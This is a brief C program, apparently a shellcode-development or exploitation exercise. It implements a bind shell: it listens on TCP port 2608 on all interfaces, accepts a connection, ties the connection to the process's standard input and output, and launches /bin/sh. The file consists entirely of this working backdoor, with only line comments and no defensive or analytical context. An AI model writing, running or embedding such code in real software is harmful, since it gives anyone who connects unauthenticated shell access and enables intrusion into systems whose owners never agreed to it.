#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>

int main() {
  int sock_des, client_des, port_num;
  struct sockaddr_in addr_ser;
  port_num = 2608;

  sock_des = socket(AF_INET, SOCK_STREAM, 0); //create a socket for IPv4, TCP, IP

  addr_ser.sin_family = AF_INET; // ipv4
  addr_ser.sin_port = htons(port_num); // port in network endian
  addr_ser.sin_addr.s_addr = INADDR_ANY; // any IP (0.0.0.0)

  bind(sock_des, (struct sockaddr*)&addr_ser, sizeof(addr_ser)); //bind to address and port
  listen(sock_des, 0); //listen to connection

  client_des = accept(sock_des, NULL, NULL); //accept incoming connection

  dup2(client_des, 0); // stdin
  dup2(client_des, 1); // stdout
  dup2(client_des, 2); // stderr

  execve("/bin/sh", NULL, NULL); //spawn a shell
  close(sock_des); //cleanup
  return 0;
}
